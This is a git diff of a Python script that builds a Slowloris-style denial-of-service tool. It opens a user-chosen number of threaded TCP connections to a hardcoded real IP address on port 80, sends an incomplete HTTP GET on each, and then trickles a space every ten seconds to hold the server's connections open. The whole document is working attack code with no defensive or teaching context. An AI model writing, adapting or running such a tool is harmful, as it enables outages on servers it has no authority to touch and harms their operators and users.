@@ -1,18 +1,31 @@
-
-import socket, _thread
+import socket, _thread, time
 
 class Loris():
 
+    rHost = None
     socket = None
     thread = None
     running = True
+    primerSent = True
+    id = None
+
+    def send(self, data):
+        try:
+            self.socket.send(str(data).encode("UTF-8"))
+            return True
+        except socket.error:
+            return False
 
     def attack(self):
+        print(str(self.id)+" is attack")
+        self.running = True
+        self.send(("GET "+self.rHost+" HTTP/1.0\n"))
         while(self.running):
-            self.socket.send("hello\n".encode("UTF-8"))
-            self.running = False
+            self.send(" ")
+            time.sleep(10)
 
-    def __init__(self, rHost, rPort):
+    def __init__(self, rHost, rPort, id):
+        self.rHost = rHost
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             self.socket.connect((rHost, rPort))
@@ -20,17 +33,27 @@ class Loris():
             self.running = False
             return
         self.thread = _thread.start_new_thread(self.attack, ())
+        self.id = id+1
 
 def Main():
     lori = []
+    running = True
+    numberOfLori = input("How many lori? ")
 
-    for x in range(1000):
-        loris = Loris("172.217.22.174", 80)
+
+    for x in range(int(numberOfLori)-1):
+        loris = Loris("172.217.22.174", 80, x)
         if(not loris.running):
             print("Loris Could Not Connect Stopping Attack")
             break
-        loris.attack()
         lori.append(loris)
+
+    while(running):
+        time.sleep(1)
+        command = input(">> ")
+        if(command == ":q"):
+            running = False
+        print("Command Not Recognised")
 
 if __name__ == "__main__":
     Main()
